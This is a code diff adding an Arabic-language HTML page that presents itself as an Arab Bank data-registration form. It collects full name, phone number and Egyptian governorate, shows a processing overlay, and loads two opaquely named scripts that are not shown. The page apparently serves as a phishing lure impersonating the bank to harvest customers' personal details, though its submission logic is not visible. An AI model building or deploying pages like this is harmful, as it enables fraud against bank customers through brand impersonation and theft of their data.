@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>البنك العربي - تسجيل البيانات</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Cairo', sans-serif; background-color: #FFFFFF; color: #333; direction: rtl; line-height: 1.6; overflow-x: hidden; }
+        .container { max-width: 400px; margin: 0 auto; min-height: 100vh; display: flex; flex-direction: column; background-color: #FFFFFF; }
+        .logo-section { text-align: center; padding: 50px 20px 40px; }
+        .arab-bank-logo { width: 300px; height: auto; margin: 0 auto; display: block; }
+        .form-section { padding: 0 20px; flex-grow: 1; }
+        .input-group { margin-bottom: 20px; }
+        .input-label { display: block; font-size: 16px; font-weight: 500; color: #333; margin-bottom: 8px; padding-right: 5px; }
+        .input-field { width: 100%; padding: 15px 20px; border: 1px solid #CCC; border-radius: 25px; font-size: 16px; background: #FFF; color: #333; direction: rtl; font-family: 'Cairo', sans-serif; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .input-field::placeholder { color: #AAA; }
+        .input-field:focus { outline: none; border-color: #0066CC; box-shadow: 0 0 0 2px rgba(0,102,204,0.2); }
+        .submit-btn { width: 100%; padding: 15px 20px; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; cursor: not-allowed; font-family: 'Cairo', sans-serif; transition: all 0.3s ease; opacity: 0.45; pointer-events: none; color: white; background-color: #0066CC; margin-top: 25px; margin-bottom: 30px; }
+        .submit-btn.active { opacity: 1; cursor: pointer; pointer-events: auto; }
+        .submit-btn.active:hover { transform: translateY(-1px); box-shadow: 0 4px 14px rgba(0,0,0,0.2); }
+
+        #loadingOverlay { display:none;position:fixed;inset:0;background-color:rgba(0,0,0,0.6);z-index:9999;justify-content:center;align-items:center;flex-direction:column; }
+        #loadingOverlay.show { display:flex; }
+        #loadingOverlay h5 { color:white;margin-top:20px; }
+        #loadingOverlay p { color:rgba(255,255,255,0.8); }
+        @media (max-width:480px) { .container{max-width:100%;margin:0;} .form-section{padding:0 15px;} .logo-section{padding:30px 15px;} .arab-bank-logo{width:180px;} }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo-section">
+        <img src="logo.png" alt="شعار البنك العربي" class="arab-bank-logo">
+    </div>
+    <div class="form-section">
+        <div class="input-group">
+            <label for="fullName" class="input-label">الاسم الكامل</label>
+            <input type="text" id="fullName" class="input-field" placeholder="أدخل اسمك الكامل" required>
+        </div>
+        <div class="input-group">
+            <label for="phoneNumber" class="input-label">رقم الهاتف</label>
+            <input type="tel" id="phoneNumber" class="input-field" placeholder="أدخل رقم الهاتف" maxlength="11" required>
+        </div>
+        <div class="input-group">
+            <label for="address" class="input-label">العنوان</label>
+            <select id="address" class="input-field" required>
+                <option value="" disabled selected>اختر المحافظة</option>
+                <option value="القاهرة">القاهرة</option>
+                <option value="الجيزة">الجيزة</option>
+                <option value="الإسكندرية">الإسكندرية</option>
+                <option value="الدقهلية">الدقهلية</option>
+                <option value="البحيرة">البحيرة</option>
+                <option value="الشرقية">الشرقية</option>
+                <option value="المنوفية">المنوفية</option>
+                <option value="الغربية">الغربية</option>
+                <option value="كفر الشيخ">كفر الشيخ</option>
+                <option value="الفيوم">الفيوم</option>
+                <option value="بني سويف">بني سويف</option>
+                <option value="المنيا">المنيا</option>
+                <option value="أسيوط">أسيوط</option>
+                <option value="سوهاج">سوهاج</option>
+                <option value="قنا">قنا</option>
+                <option value="الأقصر">الأقصر</option>
+                <option value="أسوان">أسوان</option>
+                <option value="الإسماعيلية">الإسماعيلية</option>
+                <option value="السويس">السويس</option>
+                <option value="البحر الأحمر">البحر الأحمر</option>
+                <option value="الوادي الجديد">الوادي الجديد</option>
+                <option value="مطروح">مطروح</option>
+                <option value="دمياط">دمياط</option>
+                <option value="بورسعيد">بورسعيد</option>
+                <option value="شمال سيناء">شمال سيناء</option>
+                <option value="جنوب سيناء">جنوب سيناء</option>
+            </select>
+        </div>
+        <button type="button" class="submit-btn" id="submitBtn" disabled>إرسال البيانات</button>
+    </div>
+</div>
+
+<div id="loadingOverlay">
+    <div class="spinner-border text-light" role="status" style="width:3rem;height:3rem;border:4px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 1s linear infinite;"></div>
+    <h5 class="font-weight-bold" style="font-family:'Cairo',sans-serif;">جاري المعالجة...</h5>
+    <p style="font-family:'Cairo',sans-serif;">يرجى الانتظار</p>
+</div>
+<style>@keyframes spin{to{transform:rotate(360deg);}}</style>
+
+<script src="js/a1.js"></script>
+<script src="js/kn5k.js"></script>
+</body>
+</html>
